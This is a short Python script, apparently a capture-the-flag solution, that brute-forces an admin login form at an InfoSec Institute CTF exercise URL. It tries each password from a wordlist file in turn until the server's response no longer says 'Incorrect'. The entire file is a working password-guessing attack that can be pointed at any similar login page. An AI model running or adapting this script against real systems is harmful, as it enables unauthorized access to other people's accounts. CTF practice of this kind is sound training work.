import requests
f=open("password.lst", "r").read().split('\n') # Open and read list with passwords
for i in f:
	data={"username": "admin",
		"password": i,
		"logIn": "Login"} # data for post reqeust
	r=requests.post('http://ctf.infosecinstitute.com/ctf2/exercises/ex12.php', data=data) # request
	if 'Incorrect' in r.text: # the loop will work while the password is incorrect
		print(i)
	else:
		print('Correct password: '+i)
		break
		f.close()